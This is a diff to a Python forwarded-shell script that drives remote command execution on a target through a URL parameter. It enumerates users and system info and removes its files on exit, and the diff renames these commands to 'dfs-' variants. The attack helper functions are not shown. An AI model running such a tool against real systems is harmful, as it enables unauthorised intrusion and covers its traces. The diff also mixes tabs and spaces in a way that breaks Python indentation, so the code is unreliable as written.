@@ -273,14 +273,15 @@ if __name__ == '__main__':
 
     print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Type exit-shell to quit from the forwarded shell\n" + c.END)
     
+	customCommands = ["dfs-enum", "enum-dfs", "dfs-exit", "exit-dfs", "dfs-forward", "forward-dfs"]
     # Loop to execute commands
-    while True:
+	while True:
         if user == "root":
             command_to_exec = input(user.strip('\n') + "@" + hostname.strip('\n') + ":~# ")
         else:
             command_to_exec = input(user.strip('\n') + "@" + hostname.strip('\n') + ":~$ ")
         
-        if command_to_exec == "sysenum" or command_to_exec == "sys-enum":
+        if command_to_exec == "dfs-enum" or command_to_exec == "enum-dfs":
           user, hostname, ip, uname, id_output, users, path = enumSys(url, parameter)
           print(c.YELLOW + "\nInformation" + c.END)
           print(c.YELLOW + "-----------" + c.END)
@@ -292,18 +293,19 @@ if __name__ == '__main__':
           print(c.BLUE + "Users in /home: " + users.strip('\n') + c.END)
           print(c.BLUE + "System info: " + uname + c.END) 
             
-        if command_to_exec == "exit-shell" or command_to_exec == "shell-exit":
-            removeFiles(url, parameter)
-            print(c.BLUE + "[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Exiting from shell, bye!" + c.END)
-            sys.exit(0)
-
-        execCommand(url, parameter, command_to_exec + "\n")
-		# Read command output
-        resp = readCommand(url, parameter)
-		# Print command output
-        print(resp)
-		# Clear the file of the output
-        clearOutput(url, parameter)
+		if command_to_exec == "dfs-exit" or command_to_exec == "exit-dfs":
+			removeFiles(url, parameter)
+			print(c.BLUE + "[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Exiting from shell, bye!" + c.END)
+			sys.exit(0)
+	
+		if command_to_exec not in customCommands:
+			execCommand(url, parameter, command_to_exec + "\n")
+			# Read command output
+			resp = readCommand(url, parameter)
+			# Print command output
+			print(resp)
+			# Clear the file of the output
+			clearOutput(url, parameter)
 
 
 
